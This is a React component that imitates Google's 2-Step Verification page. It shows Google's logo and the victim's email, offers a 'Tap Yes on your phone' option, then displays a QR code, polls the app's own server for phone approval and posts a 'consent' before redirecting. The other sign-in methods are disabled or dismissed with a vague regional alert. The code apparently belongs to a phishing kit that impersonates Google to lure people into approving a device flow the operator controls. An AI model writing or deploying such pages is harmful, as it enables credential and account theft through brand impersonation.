import React, { useState, useEffect } from "react";
import { useLocation } from "wouter";
import { Smartphone, Shield, KeyRound, HelpCircle, CheckCircle2, Loader2 } from "lucide-react";
import { useAuth } from "@/hooks/useAuth";
import { useQueryClient } from "@tanstack/react-query";
import { QRCodeSVG } from "qrcode.react";

export default function AuthMethods() {
  const [, setLocation] = useLocation();
  const { user } = useAuth();
  const queryClient = useQueryClient();
  const [step, setStep] = useState<"select" | "phone-wait">("select");
  
  // Real-time Device Sync Polling
  useEffect(() => {
    let interval: NodeJS.Timeout;
    
    if (step === "phone-wait") {
      // Poll every 2 seconds to check if phone has verified
      interval = setInterval(async () => {
        const res = await fetch("/api/auth/user");
        if (res.ok) {
          const data = await res.json();
          if (data.isPushVerified) {
            clearInterval(interval);
            verifySuccess();
          }
        }
      }, 2000);
    }
    
    return () => clearInterval(interval);
  }, [step]);

  const handleMethodSelect = async (method: string) => {
    if (method === "tap-yes") {
      // Reset push status before starting
      await fetch("/api/auth/push-reset", { method: "POST" });
      setStep("phone-wait");
    } else {
      alert("This method is currently being initialized for your region.");
    }
  };

  const verifySuccess = async () => {
    try {
      await fetch("/api/auth/consent", { method: "POST" });
      queryClient.invalidateQueries({ queryKey: ["/api/auth/user"] });
      setLocation("/onboarding");
    } catch (e) {
      console.error(e);
    }
  };

  // Generate the actual link for scanning with the session token
  const verificationLink = `${window.location.origin}/mobile-verify?userId=${user?.id}`;

  if (step === "phone-wait") {
    return (
      <div className="min-h-screen bg-white flex flex-col items-center justify-center p-6 text-[#1f1f1f] font-sans">
        <div className="w-full max-w-[440px] border border-[#dadce0] rounded-lg p-10 flex flex-col items-center shadow-sm">
            <img src="https://www.gstatic.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google" className="h-6 mb-10" />
            
            <h1 className="text-[24px] font-normal mb-8 text-center leading-tight">Authentic Device Sync</h1>
            
            <div className="bg-slate-50 p-6 rounded-3xl border-2 border-slate-100 mb-8 flex flex-col items-center">
               <QRCodeSVG value={verificationLink} size={180} />
               <div className="mt-6 flex items-center gap-3 text-slate-500 font-medium text-[13px]">
                  <Loader2 className="w-4 h-4 animate-spin text-blue-500" />
                  <span>Waiting for mobile response...</span>
               </div>
            </div>

            <p className="text-[14px] text-center mb-8 text-[#5f6368] leading-relaxed">
               Scan this code with your phone (or open <a href={verificationLink} target="_blank" className="text-blue-600 underline">this link</a> on your device) to receive the <b>"Tap Yes"</b> notification.
            </p>

            <div className="w-full pt-6 border-t border-[#f1f3f4] flex justify-center">
               <button 
                onClick={() => setLocation("/verify-otp")}
                className="text-[14px] text-[#1a73e8] font-medium hover:bg-blue-50 px-4 py-2 rounded-lg"
               >
                 Try another way
               </button>
            </div>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-white flex flex-col items-center justify-center p-6 text-[#1f1f1f] font-sans">
      <div className="w-full max-w-[440px] border border-[#dadce0] rounded-lg p-10 flex flex-col items-center shadow-sm">
         <img src="https://www.gstatic.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google" className="h-6 mb-8" />
         
         <div className="w-full text-center">
            <Smartphone className="w-12 h-12 text-[#ff6d00] mx-auto mb-6" />
            <h1 className="text-[28px] font-normal leading-tight mb-4">2-Step Verification</h1>
            <p className="text-[14px] mb-6 text-[#1f1f1f]">
               To help keep your account safe, Google wants to make sure it's really you trying to sign in
            </p>
            <div className="flex items-center justify-center gap-1.5 mb-10">
               <div className="w-5 h-5 bg-[#5f6368] rounded-full flex items-center justify-center text-[10px] text-white font-bold">L</div>
               <span className="text-[14px] text-[#3c4043] font-medium">{user?.email}</span>
            </div>
         </div>

         <div className="w-full flex flex-col text-left space-y-1">
            <h3 className="text-[16px] font-medium mb-3">Choose how you want to sign in:</h3>
            
            <button 
              onClick={() => handleMethodSelect("tap-yes")}
              className="group flex items-center gap-4 py-4 px-2 hover:bg-[#f8f9fa] rounded-lg transition-colors border-b border-[#f1f3f4]"
            >
               <Smartphone className="w-5 h-5 text-[#1a73e8]" />
               <div className="flex flex-col text-left">
                  <span className="text-[14px] text-[#3c4043] font-medium group-hover:text-[#1a73e8]">Tap <span className="font-bold">Yes</span> on your phone or tablet</span>
               </div>
            </button>

            <button className="group flex items-center gap-4 py-4 px-2 hover:bg-[#f8f9fa] rounded-lg transition-colors border-b border-[#f1f3f4] opacity-50 cursor-not-allowed">
               <Shield className="w-5 h-5 text-[#1a73e8]" />
               <div className="flex flex-col text-left">
                  <span className="text-[14px] text-[#3c4043] font-medium group-hover:text-[#1a73e8]">Use your phone or tablet to get a security code (even if it's offline)</span>
               </div>
            </button>

            <button className="group flex items-center gap-4 py-4 px-2 hover:bg-[#f8f9fa] rounded-lg transition-colors border-b border-[#f1f3f4] opacity-50 cursor-not-allowed">
               <KeyRound className="w-5 h-5 text-[#1a73e8]" />
               <div className="flex flex-col text-left">
                  <span className="text-[14px] text-[#3c4043] font-medium group-hover:text-[#1a73e8]">Use your passkey</span>
               </div>
            </button>

            <button 
             onClick={() => setLocation("/verify-otp")}
             className="group flex items-center gap-4 py-4 px-2 hover:bg-[#f8f9fa] rounded-lg transition-colors"
            >
               <HelpCircle className="w-5 h-5 text-[#1a73e8]" />
               <div className="flex flex-col text-left">
                  <span className="text-[14px] text-[#3c4043] font-medium group-hover:text-[#1a73e8]">Try another way</span>
               </div>
            </button>
         </div>
      </div>
    </div>
  );
}
